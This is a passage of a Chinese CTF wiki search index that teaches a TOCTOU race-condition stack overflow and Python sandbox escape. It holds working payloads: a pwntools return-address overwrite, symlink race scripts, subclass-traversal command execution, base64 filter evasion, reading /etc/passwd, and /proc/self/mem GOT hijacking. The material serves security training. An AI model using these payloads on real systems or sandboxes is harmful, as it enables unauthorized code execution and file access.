\u5982\u679c\u6211\u4eec\u5728\u7a0b\u5e8f\u68c0\u67e5\u5b8c\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u540e\uff0c\u5c06\u5bf9\u5e94\u7684\u6587\u4ef6\u5220\u9664\uff0c\u5e76\u7b26\u53f7\u94fe\u63a5\u5230\u53e6\u5916\u4e00\u4e2a\u66f4\u5927\u7684\u6587\u4ef6\uff0c\u90a3\u4e48\u7a0b\u5e8f\u6240\u8bfb\u5165\u7684\u5185\u5bb9\u5c31\u4f1a\u66f4\u591a\uff0c\u4ece\u800c\u5c31\u4f1a\u4ea7\u751f\u6808\u6ea2\u51fa\u3002 \u57fa\u672c\u601d\u8def \u00b6 \u90a3\u4e48\uff0c\u57fa\u672c\u601d\u8def\u6765\u4e86\uff0c\u6211\u4eec\u662f\u60f3\u8981\u83b7\u5f97\u5bf9\u5e94\u7684 flag \u7684\u5185\u5bb9\u3002\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u901a\u8fc7\u6808\u6ea2\u51fa\u4fee\u6539\u5bf9\u5e94\u7684 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5373\u53ef\uff0c\u901a\u8fc7\u53cd\u6c47\u7f16\u4ee5\u53ca\u8c03\u8bd5\u53ef\u4ee5\u83b7\u5f97 showflag \u7684\u5730\u5740\uff0c\u83b7\u5f97\u5bf9\u5e94\u7684payload \u279c racetest cat payload . py from pwn import * test = ELF ( './test' ) payload = 'a' * 0x100 + 'b' * 8 + p64 ( test . symbols [ 'showflag' ]) open ( 'big' , 'w' ) . write ( payload ) \u5bf9\u5e94\u4e24\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u811a\u672c\u4e3a \u279c racetest cat exp.sh #!/bin/sh for i in ` seq 500 ` do cp small fake sleep 0 .000008 rm fake ln -s big fake rm fake done \u279c racetest cat run.sh #!/bin/sh for i in ` seq 1000 ` do ./test fake done \u5176\u4e2d exp \u7528\u4e8e\u6765\u7ade\u4e89\u5728\u76f8\u5e94\u7684\u7a97\u53e3\u5185\u5220\u9664 fake \u6587\u4ef6\uff0c\u540c\u65f6\u6267\u884c\u7b26\u53f7\u94fe\u63a5\u3002run \u7528\u6765\u6267\u884c\u7a0b\u5e8f\u3002 \u5177\u4f53\u6548\u679c \u00b6 \u279c racetest ( sh exp.sh & ) && sh run.sh [ ... ] file size is too large!! open file failed!!: No such file or directory open file failed!!: No such file or directory open file failed!!: No such file or directory open file failed!!: No such file or directory file size is too large!! open file failed!!: No such file or directory open file failed!!: No such file or directory flag { race_condition_succeed! } [ ... ] \u5176\u4e2d\u6210\u529f\u7684\u5173\u952e\u5728\u4e8e\u5bf9\u5e94\u7684 sleep \u7684\u65f6\u95f4\u9009\u62e9\u3002 \u53c2\u8003 \u00b6 http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html http://www.cnblogs.com/huxiao-tee/p/4660352.html https://github.com/dirtycow/dirtycow.github.io","title":"\u4f8b\u9898"},{"location":"pwn/race-condition/problem/#_1","text":"","title":"\u9898\u76ee"},{"location":"pwn/race-condition/problem/#_2","text":"","title":"\u6784\u9020\u4f8b\u5b50"},{"location":"pwn/race-condition/problem/#_3","text":"\u6e90\u4ee3\u7801\u5982\u4e0b #include <fcntl.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/stat.h> #include <unistd.h> void showflag () { system ( \"cat flag\" ); } void vuln ( char * file , char * buf ) { int number ; int index = 0 ; int fd = open ( file , O_RDONLY ); if ( fd == - 1 ) { perror ( \"open file failed!!\" ); return ; } while ( 1 ) { number = read ( fd , buf + index , 128 ); if ( number <= 0 ) { break ; } index += number ; } buf [ index + 1 ] = '\\x00' ; } void check ( char * file ) { struct stat tmp ; if ( strcmp ( file , \"flag\" ) == 0 ) { puts ( \"file can not be flag!!\" ); exit ( 0 ); } stat ( file , & tmp ); if ( tmp . st_size > 255 ) { puts ( \"file size is too large!!\" ); exit ( 0 ); } } int main ( int argc , char * argv [ argc ]) { char buf [ 256 ]; if ( argc == 2 ) { check ( argv [ 1 ]); vuln ( argv [ 1 ], buf ); } else { puts ( \"Usage ./prog <filename>\" ); } return 0 ; }","title":"\u6e90\u4ee3\u7801"},{"location":"pwn/race-condition/problem/#_4","text":"\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u5982\u4e0b \u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u662f\u4e0d\u662f \u201cflag\u201d\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u5c31\u9000\u51fa\u3002 \u68c0\u67e5\u4f20\u5165\u7684\u547d\u4ee4\u884c\u53c2\u6570\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u662f\u5426\u5927\u4e8e 255\uff0c\u662f\u7684\u8bdd\uff0c\u5c31\u76f4\u63a5\u9000\u51fa\u3002 \u5c06\u547d\u4ee4\u884c\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u6587\u4ef6\u5185\u5bb9\u8bfb\u5165\u5230 buf \u4e2d \uff0cbuf \u7684\u5927\u5c0f\u4e3a 256\u3002 \u770b\u4f3c\u6211\u4eec\u68c0\u67e5\u4e86\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u540c\u65f6 buf \u7684\u5927\u5c0f\u4e5f\u53ef\u4ee5\u6ee1\u8db3\u5bf9\u5e94\u7684\u6700\u5927\u5927\u5c0f\uff0c\u4f46\u662f\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u95ee\u9898\u3002 \u5982\u679c\u6211\u4eec\u5728\u7a0b\u5e8f\u68c0\u67e5\u5b8c\u5bf9\u5e94\u7684\u6587\u4ef6\u5927\u5c0f\u540e\uff0c\u5c06\u5bf9\u5e94\u7684\u6587\u4ef6\u5220\u9664\uff0c\u5e76\u7b26\u53f7\u94fe\u63a5\u5230\u53e6\u5916\u4e00\u4e2a\u66f4\u5927\u7684\u6587\u4ef6\uff0c\u90a3\u4e48\u7a0b\u5e8f\u6240\u8bfb\u5165\u7684\u5185\u5bb9\u5c31\u4f1a\u66f4\u591a\uff0c\u4ece\u800c\u5c31\u4f1a\u4ea7\u751f\u6808\u6ea2\u51fa\u3002","title":"\u5206\u6790"},{"location":"pwn/race-condition/problem/#_5","text":"\u90a3\u4e48\uff0c\u57fa\u672c\u601d\u8def\u6765\u4e86\uff0c\u6211\u4eec\u662f\u60f3\u8981\u83b7\u5f97\u5bf9\u5e94\u7684 flag \u7684\u5185\u5bb9\u3002\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u901a\u8fc7\u6808\u6ea2\u51fa\u4fee\u6539\u5bf9\u5e94\u7684 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u5373\u53ef\uff0c\u901a\u8fc7\u53cd\u6c47\u7f16\u4ee5\u53ca\u8c03\u8bd5\u53ef\u4ee5\u83b7\u5f97 showflag \u7684\u5730\u5740\uff0c\u83b7\u5f97\u5bf9\u5e94\u7684payload \u279c racetest cat payload . py from pwn import * test = ELF ( './test' ) payload = 'a' * 0x100 + 'b' * 8 + p64 ( test . symbols [ 'showflag' ]) open ( 'big' , 'w' ) . write ( payload ) \u5bf9\u5e94\u4e24\u4e2a\u6761\u4ef6\u7ade\u4e89\u7684\u811a\u672c\u4e3a \u279c racetest cat exp.sh #!/bin/sh for i in ` seq 500 ` do cp small fake sleep 0 .000008 rm fake ln -s big fake rm fake done \u279c racetest cat run.sh #!/bin/sh for i in ` seq 1000 ` do ./test fake done \u5176\u4e2d exp \u7528\u4e8e\u6765\u7ade\u4e89\u5728\u76f8\u5e94\u7684\u7a97\u53e3\u5185\u5220\u9664 fake \u6587\u4ef6\uff0c\u540c\u65f6\u6267\u884c\u7b26\u53f7\u94fe\u63a5\u3002run \u7528\u6765\u6267\u884c\u7a0b\u5e8f\u3002","title":"\u57fa\u672c\u601d\u8def"},{"location":"pwn/race-condition/problem/#_6","text":"\u279c racetest ( sh exp.sh & ) && sh run.sh [ ... ] file size is too large!! open file failed!!: No such file or directory open file failed!!: No such file or directory open file failed!!: No such file or directory open file failed!!: No such file or directory file size is too large!! open file failed!!: No such file or directory open file failed!!: No such file or directory flag { race_condition_succeed! } [ ... ] \u5176\u4e2d\u6210\u529f\u7684\u5173\u952e\u5728\u4e8e\u5bf9\u5e94\u7684 sleep \u7684\u65f6\u95f4\u9009\u62e9\u3002","title":"\u5177\u4f53\u6548\u679c"},{"location":"pwn/race-condition/problem/#_7","text":"http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html http://www.cnblogs.com/huxiao-tee/p/4660352.html https://github.com/dirtycow/dirtycow.github.io","title":"\u53c2\u8003"},{"location":"pwn/sandbox/python-sandbox-escape/","text":"Python\u6c99\u76d2 \u00b6 \u6240\u8c13\u7684 Python \u6c99\u76d2\uff0c\u5373\u4ee5\u4e00\u5b9a\u7684\u65b9\u6cd5\u6a21\u62df Python \u7ec8\u7aef\uff0c\u5b9e\u73b0\u7528\u6237\u5bf9 Python \u7684\u4f7f\u7528\u3002 Python\u6c99\u7bb1\u9003\u9038\u7684\u4e00\u4e9b\u65b9\u6cd5 \u00b6 \u6211\u4eec\u901a\u5e38\u6240\u8bf4\u7684 Python \u6c99\u7bb1\u9003\u9038\u5c31\u662f\u7ed5\u8fc7\u6a21\u62df\u7684 Python \u7ec8\u7aef\uff0c\u6700\u7ec8\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u3002 \u5bfc\u5165\u6a21\u5757 \u00b6 \u5728 Python \u7684\u5185\u5efa\u51fd\u6570\u4e2d\uff0c\u6709\u4e00\u4e9b\u51fd\u6570\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5b9e\u73b0\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff1a os.system() os.popen() commands.getstatusoutput() commands.getoutput() commands.getstatus() subprocess.call(command, shell=True) subprocess.Popen(command, shell=True) pty.spawn() \u5728 Python \u4e2d\u5bfc\u5165\u6a21\u5757\u7684\u65b9\u6cd5\u901a\u5e38\u6709\u4e09\u79cd(xxx\u4e3a\u6a21\u5757\u540d\u79f0\uff09)\uff1a 1. import xxx 2. from xxx import * 3. __import__('xxx') \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0a\u8ff0\u7684\u5bfc\u5165\u65b9\u6cd5\uff0c\u5bfc\u5165\u76f8\u5173\u6a21\u5757\u5e76\u4f7f\u7528\u4e0a\u8ff0\u7684\u51fd\u6570\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u3002 \u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5 \u901a\u8fc7\u8def\u5f84\u5f15\u5165\u6a21\u5757 \uff1a \u5982\u5728 linux \u7cfb\u7edf\u4e2d Python \u7684 os \u6a21\u5757\u7684\u8def\u5f84\u4e00\u822c\u90fd\u662f\u5728 /usr/lib/python2.7/os.py \uff0c\u5f53\u77e5\u9053\u8def\u5f84\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u64cd\u4f5c\u5bfc\u5165\u6a21\u5757\uff0c\u7136\u540e\u8fdb\u4e00\u6b65\u4f7f\u7528\u76f8\u5173\u51fd\u6570\u3002 >>> import sys >>> sys . modules [ 'os' ] = '/usr/lib/python2.7/os.py' >>> import os >>> \u5176\u4ed6\u7684\u5371\u9669\u51fd\u6570\u4e3e\u4f8b \u5982 execfile \u6587\u4ef6\u6267\u884c >>> execfile ( '/usr/lib/python2.7/os.py' ) >>> system ( 'cat /etc/passwd' ) root : x : 0 : 0 : root : / root : / bin / bash daemon : x : 1 : 1 : daemon : / usr / sbin : / usr / sbin / nologin bin : x : 2 : 2 : bin : / bin : / usr / sbin / nologin sys : x : 3 : 3 : sys : / dev : / usr / sbin / nologin ... >>> getcwd () '/usr/lib/python2.7' timeit import timeit timeit . timeit ( \"__import__('os').system('dir')\" , number = 1 ) exec \u548c eval \u6bd4\u8f83\u7ecf\u5178\u4e86 eval ( '__import__(\"os\").system(\"dir\")' ) platform import platform print platform . popen ( 'dir' ) . read () \u4f46\u662f\uff0c\u6b63\u5e38\u7684 Python \u6c99\u7bb1\u4f1a\u4ee5\u9ed1\u540d\u5355\u7684\u5f62\u5f0f\u7981\u6b62\u4f7f\u7528\u4e00\u4e9b\u6a21\u5757\u5982 os \u6216\u4ee5\u767d\u540d\u5355\u7684\u5f62\u5f0f\u53ea\u5141\u8bb8\u7528\u6237\u4f7f\u7528\u6c99\u7bb1\u63d0\u4f9b\u7684\u6a21\u5757\uff0c\u7528\u4ee5\u963b\u6b62\u7528\u6237\u7684\u5371\u9669\u64cd\u4f5c\u3002\u800c\u5982\u4f55\u8fdb\u4e00\u6b65\u9003\u9038\u6c99\u7bb1\u5c31\u662f\u6211\u4eec\u7684\u91cd\u70b9\u7814\u7a76\u5185\u5bb9\u3002 Python \u7684\u5185\u5efa\u51fd\u6570 \u00b6 \u5f53\u6211\u4eec\u4e0d\u80fd\u5bfc\u5165\u6a21\u5757\uff0c\u6216\u8005\u60f3\u8981\u5bfc\u5165\u7684\u6a21\u5757\u88ab\u7981\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u80fd\u5bfb\u6c42 Python \u672c\u8eab\u5185\u7f6e\u51fd\u6570\uff08\u5373\u901a\u5e38\u4e0d\u7528\u4eba\u4e3a\u5bfc\u5165\uff0cPython\u672c\u8eab\u9ed8\u8ba4\u5df2\u7ecf\u5bfc\u5165\u7684\u51fd\u6570\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u53ef\u4ee5\u901a\u8fc7 dir __builtin__ \u6765\u83b7\u53d6\u5185\u7f6e\u51fd\u6570\u5217\u8868 >>> dir ( __builtins__ ) [ 'ArithmeticError' , 'AssertionError' , 'AttributeError' , 'BaseException' , 'BufferError' , 'BytesWarning' , 'DeprecationWarning' , 'EOFError' , 'Ellipsis' , 'EnvironmentError' , 'Exception' , 'False' , 'FloatingPointError' , 'FutureWarning' , 'GeneratorExit' , 'IOError' , 'ImportError' , 'ImportWarning' , 'IndentationError' , 'IndexError' , 'KeyError' , 'KeyboardInterrupt' , 'LookupError' , 'MemoryError' , 'NameError' , 'None' , 'NotImplemented' , 'NotImplementedError' , 'OSError' , 'OverflowError' , 'PendingDeprecationWarning' , 'ReferenceError' , 'RuntimeError' , 'RuntimeWarning' , 'StandardError' , 'StopIteration' , 'SyntaxError' , 'SyntaxWarning' , 'SystemError' , 'SystemExit' , 'TabError' , 'True' , 'TypeError' , 'UnboundLocalError' , 'UnicodeDecodeError' , 'UnicodeEncodeError' , 'UnicodeError' , 'UnicodeTranslateError' , 'UnicodeWarning' , 'UserWarning' , 'ValueError' , 'Warning' , 'ZeroDivisionError' , '_' , '__debug__' , '__doc__' , '__import__' , '__name__' , '__package__' , 'abs' , 'all' , 'any' , 'apply' , 'basestring' , 'bin' , 'bool' , 'buffer' , 'bytearray' , 'bytes' , 'callable' , 'chr' , 'classmethod' , 'cmp' , 'coerce' , 'compile' , 'complex' , 'copyright' , 'credits' , 'delattr' , 'dict' , 'dir' , 'divmod' , 'enumerate' , 'eval' , 'execfile' , 'exit' , 'file' , 'filter' , 'float' , 'format' , 'frozenset' , 'getattr' , 'globals' , 'hasattr' , 'hash' , 'help' , 'hex' , 'id' , 'input' , 'int' , 'intern' , 'isinstance' , 'issubclass' , 'iter' , 'len' , 'license' , 'list' , 'locals' , 'long' , 'map' , 'max' , 'memoryview' , 'min' , 'next' , 'object' , 'oct' , 'open' , 'ord' , 'pow' , 'print' , 'property' , 'quit' , 'range' , 'raw_input' , 'reduce' , 'reload' , 'repr' , 'reversed' , 'round' , 'set' , 'setattr' , 'slice' , 'sorted' , 'staticmethod' , 'str' , 'sum' , 'super' , 'tuple' , 'type' , 'unichr' , 'unicode' , 'vars' , 'xrange' , 'zip' ] \u5728Python\u4e2d\uff0c\u4e0d\u5f15\u5165\u76f4\u63a5\u4f7f\u7528\u7684\u5185\u7f6e\u51fd\u6570\u88ab\u6210\u4e3a builtin \u51fd\u6570\uff0c\u968f\u7740 __builtin__ \u8fd9\u4e2a\u6a21\u5757\u81ea\u52a8\u5f15\u5165\u5230\u73af\u5883\u4e2d\u3002\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5f15\u5165\u7684\u6a21\u5757\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 __dict__ \u5f15\u5165\u6211\u4eec\u60f3\u8981\u5f15\u5165\u7684\u6a21\u5757\u3002 __dict__ \u7684\u4f5c\u7528\u662f\u5217\u51fa\u4e00\u4e2a\u6a21\u7ec4/\u7c7b/\u5bf9\u8c61 \u4e0b\u9762 \u6240\u6709\u7684\u5c5e\u6027\u548c\u51fd\u6570\u3002\u8fd9\u5728\u6c99\u76d2\u9003\u9038\u4e2d\u662f\u5f88\u6709\u7528\u7684,\u53ef\u4ee5\u627e\u5230\u9690\u85cf\u5728\u5176\u4e2d\u7684\u4e00\u4e9b\u4e1c\u897f __dict__ \u80fd\u505a\u4ec0\u4e48\u5462\uff1f \u6211\u4eec\u77e5\u9053\uff0c\u4e00\u4e2a\u6a21\u5757\u5bf9\u8c61\u6709\u4e00\u4e2a\u7531\u5b57\u5178\u5bf9\u8c61\u5b9e\u73b0\u7684\u547d\u540d\u7a7a\u95f4\uff0c\u5c5e\u6027\u7684\u5f15\u7528\u4f1a\u88ab\u8f6c\u6362\u4e3a\u8fd9\u4e2a\u5b57\u5178\u4e2d\u7684\u67e5\u627e\uff0c\u4f8b\u5982\uff0cm.x \u7b49\u540c\u4e8e m.dict[\"x\"]\u3002 \u7ed5\u8fc7\u5b9e\u4f8b\uff1a \u9996\u5148\u901a\u8fc7 base64 \u7ed5\u8fc7\u5b57\u7b26\u660e\u6587\u68c0\u6d4b >>> import base64 >>> base64 . b64encode ( '__import__' ) 'X19pbXBvcnRfXw==' >>> base64 . b64encode ( 'os' ) 'b3M=' \u7136\u540e\u901a\u8fc7 __dict__ \u5f15\u7528 >>> __builtins__ . __dict__ [ 'X19pbXBvcnRfXw==' . decode ( 'base64' )]( 'b3M=' . decode ( 'base64' )) \u5982\u679c\u4e00\u4e9b \u5185\u655b\u51fd\u6570\u5728 builtins \u5220\u9664 \uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 reload( builtins ) \u91cd\u65b0\u8f7d\u5165\u83b7\u53d6\u4e00\u4e2a\u5b8c\u6574\u7684 builtins \u521b\u5efa\u5bf9\u8c61\u4ee5\u53ca\u5f15\u7528 \u00b6 Python \u7684 object \u7c7b\u4e2d\u96c6\u6210\u4e86\u5f88\u591a\u7684\u57fa\u7840\u51fd\u6570\uff0c\u6211\u4eec\u60f3\u8981\u8c03\u7528\u7684\u65f6\u5019\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u5bf9\u8c61\u8fdb\u800c\u5f15\u7528\u3002 \u6211\u4eec\u6709\u5e38\u89c1\u7684\u4e24\u4e2a\u65b9\u6cd5\uff1a () .__class__.__bases__ [ 0 ] '' .__class__.__mro__ [ 2 ] \u5982\uff0c\u6211\u4eec\u53ef\u901a\u8fc7 print ().__class__.__bases__[0].__subclasses__()[40](\"/etc/services\").read() \u8fbe\u5230\u6587\u4ef6\u8bfb\u53d6\u7684\u6548\u679c\uff0c \u5e38\u89c1payload #\u8bfb\u6587\u4ef6 () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( r 'C:\\1.php' ) . read () #\u5199\u6587\u4ef6 () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/var/www/html/input' , 'w' ) . write ( '123' ) #\u6267\u884c\u4efb\u610f\u547d\u4ee4 () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 59 ] . __init__ . func_globals . values ()[ 13 ][ 'eval' ]( '__import__(\"os\").popen(\"ls /var/www/html\").read()' ) \u95f4\u63a5\u5f15\u7528 \u00b6 \u5728\u6709\u4e9b\u9898\u76ee\u4e2d\uff0c\u5982\u8fd9\u6b21\u76842018\u5e74\u56fd\u8d5b\u7684 Python \u6c99\u76d2\u9898\u76ee\u4e0a\uff0cimport \u5176\u5b9e\u6574\u4e2a\u662f\u88ab\u9609\u5272\u4e86\u3002\u4f46\u662f\u5728 Python \u4e2d\uff0c\u539f\u751f\u7684 __import__ \u662f\u5b58\u5728\u88ab\u5f15\u7528\u7684\uff0c\u53ea\u8981\u6211\u4eec\u627e\u5230\u76f8\u5173\u5bf9\u8c61\u5f15\u7528\u5c31\u53ef\u4ee5\u8fdb\u4e00\u6b65\u83b7\u53d6\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\uff0c\u5177\u4f53\u4e0b\u9762\u7684demo\u4f1a\u8bb2\u8ff0\u5230 write\u4fee\u6539got\u8868 \u00b6 \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a /proc/self/mem \u7684\u5185\u5b58\u64cd\u4f5c\u65b9\u6cd5 /proc/self/mem \u662f\u5185\u5b58\u955c\u50cf\uff0c\u80fd\u591f\u901a\u8fc7\u5b83\u6765\u8bfb\u5199\u5230\u8fdb\u7a0b\u7684\u6240\u6709\u5185\u5b58\uff0c\u5305\u62ec\u53ef\u6267\u884c\u4ee3\u7801\uff0c\u5982\u679c\u6211\u4eec\u80fd\u83b7\u53d6\u5230Python\u4e00\u4e9b\u51fd\u6570\u7684\u504f\u79fb\uff0c\u5982 system \uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7\u8986\u5199 got \u8868\u8fbe\u5230 getshell\u7684\u76ee\u7684\u3002 ( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'c' + 'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 )) \u7b2c\u4e00\u4e2a\u5730\u5740\u662f system \u7684\u504f\u79fb\uff0c\u7b2c\u4e8c\u4e2a\u662ffopen\u7684\u504f\u79fb\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 objdump \u83b7\u53d6\u76f8\u5173\u4fe1\u606f \u4f8b\u5b50 \u00b6 2018 ciscn \u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u4e2d\u7684 Python \u6c99\u7bb1\u9003\u9038\u3002 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 print ().__class__.__bases__[0].__subclasses__()[40](\"/home/ctf/sandbox.py\").read() \u83b7\u53d6\u9898\u76ee\u6e90\u7801\uff0c\u7136\u540e\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5206\u6790\uff0c\u4ee5\u4e0b\u63d0\u4f9b\u4e09\u79cd\u9003\u9038\u65b9\u6cd5\u3002 \u521b\u5efa\u5bf9\u8c61\u5e76\u5229\u7528 Python \u64cd\u4f5c\u5b57\u7b26\u4e32\u7684\u7279\u6027 \u00b6 x = [ x for x in [] . __class__ . __base__ . __subclasses__ () if x . __name__ == 'ca' + 'tch_warnings' ][ 0 ] . __init__ x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'l' + 's' ) x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'l' + 's /home/ctf' ) x . __getattribute__ ( \"func_global\" + \"s\" )[ 'linecache' ] . __dict__ [ 'o' + 's' ] . __dict__ [ 'sy' + 'stem' ]( 'ca' + 't /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' ) \u52ab\u6301 got \u8868 getshell \u00b6 ( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'l' + 's /home/ctf/' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 )) ( lambda r , w : r . seek ( 0x08de2b8 ) or w . seek ( 0x08de8c8 ) or w . write ( r . read ( 8 )) or () . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( 'c' + 'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb' ))(() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'r' ),() . __class__ . __bases__ [ 0 ] . __subclasses__ ()[ 40 ]( '/proc/self/mem' , 'w' , 0 )) \u5bfb\u627e import \u7684\u95f4\u63a5\u5f15\u7528 \u00b6 \u5728\u4e0d\u65ad\u7684 dir \u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0 closure \u8fd9\u4e2a object \u4fdd\u5b58\u4e86\u53c2\u6570\uff0c\u53ef\u4ee5\u5f15\u7528\u539f\u751f\u7684 import print __import__ . __getattribute__ ( '__clo' + 'sure__' )[ 0 ] . cell_contents ( 'o' + 's' ) . __getattribute__ ( 'sy' + 'stem' )( 'l' + 's home' ) \u53c2\u8003 \u00b6 https://xz.aliyun.com/t/52#toc-10 https://blog.csdn.net/qq_35078631/article/details/78504415 https://www.anquanke.com/post/id/85571 http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01","title":"Python\u6c99\u7bb1\u9003\u9038"},{"location":"pwn/sandbox/python-sandbox-escape/#python","text":"\u6240\u8c13\u7684 Python \u6c99\u76d2\uff0c\u5373\u4ee5\u4e00\u5b9a\u7684\u65b9\u6cd5\u6a21\u62df Python \u7ec8\u7aef\uff0c\u5b9e\u73b0\u7528\u6237\u5bf9 Python \u7684\u4f7f\u7528\u3002","title":"Python\u6c99\u76d2"},{"location":"pwn/sandbox/python-sandbox-escape/#python_1","text":"\u6211\u4eec\u901a\u5e38\u6240\u8bf4\u7684 Python \u6c99\u7bb1\u9003\u9038\u5c31\u662f\u7ed5\u8fc7\u6a21\u62df\u7684 Python \u7ec8\u7aef\uff0c\u6700\u7ec8\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u3002","title":"Python\u6c99\u7bb1\u9003\u9038\u7684\u4e00\u4e9b\u65b9\u6cd5"},{"location":"pwn/sandbox/python-sandbox-escape/#_1","text":"\u5728 Python \u7684\u5185\u5efa\u51fd\u6570\u4e2d\uff0c\u6709\u4e00\u4e9b\u51fd\u6570\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5b9e\u73b0\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff1a os.system() os.popen() commands.getstatusoutput() commands.getoutput() commands.getstatus() subprocess.call(command, shell=True) subprocess.Popen(command, shell=True) pty.spawn() \u5728 Python \u4e2d\u5bfc\u5165\u6a21\u5757\u7684\u65b9\u6cd5\u901a\u5e38\u6709\u4e09\u79cd(xxx\u4e3a\u6a21\u5757\u540d\u79f0\uff09)\uff1a 1. import xxx 2. from xxx import * 3. __import__('xxx') \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0a\u8ff0\u7684\u5bfc\u5165\u65b9\u6cd5\uff0c\u5bfc\u5165\u76f8\u5173\u6a21\u5757\u5e76\u4f7f\u7528\u4e0a\u8ff0\u7684\u51fd\u6570\u5b9e\u73b0\u547d\u4ee4\u6267\u884c\u3002 \u9664\u6b64\u4e4b\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5 \u901a\u8fc7\u8def\u5f84\u5f15\u5165\u6a21\u5757 \uff1a \u5982\u5728 linux \u7cfb\u7edf\u4e2d Python \u7684 os \u6a21\u5757\u7684\u8def\u5f84\u4e00\u822c\u90fd\u662f\u5728 /usr/lib/python2.7/os.py \uff0c\u5f53\u77e5\u9053\u8def\u5f84\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u64cd\u4f5c\u5bfc\u5165\u6a21\u5757\uff0c\u7136\u540e\u8fdb\u4e00\u6b65\u4f7f\u7528\u76f8\u5173\u51fd\u6570\u3002 >>> import sys >>> sys . modules [ 'os' ] = '/usr/lib/python2.7/os.py' >>> import os >>> \u5176\u4ed6\u7684\u5371\u9669\u51fd\u6570\u4e3e\u4f8b \u5982 execfile \u6587\u4ef6\u6267\u884c >>> execfile ( '/usr/lib/python2.7/os.py' ) >>> system ( 'cat /etc/passwd' ) root : x : 0 : 0 : root : / root : / bin / bash daemon : x : 1 : 1 : daemon : / usr / sbin : / usr / sbin / nologin bin : x : 2 : 2 : bin : / bin : / usr / sbin / nologin sys : x : 3 : 3 : sys : / dev : / usr / sbin / nologin ... >>> getcwd () '/usr/lib/python2.7' timeit import timeit timeit . timeit ( \"__import__('os').system('dir')\" , number = 1 ) exec \u548c eval \u6bd4\u8f83\u7ecf\u5178\u4e86 eval ( '__import__(\"os\").system(\"dir\")' ) platform import platform print platform . popen ( 'dir' ) . read () \u4f46\u662f\uff0c\u6b63\u5e38\u7684 Python \u6c99\u7bb1\u4f1a\u4ee5\u9ed1\u540d\u5355\u7684\u5f62\u5f0f\u7981\u6b62\u4f7f\u7528\u4e00\u4e9b\u6a21\u5757\u5982 os 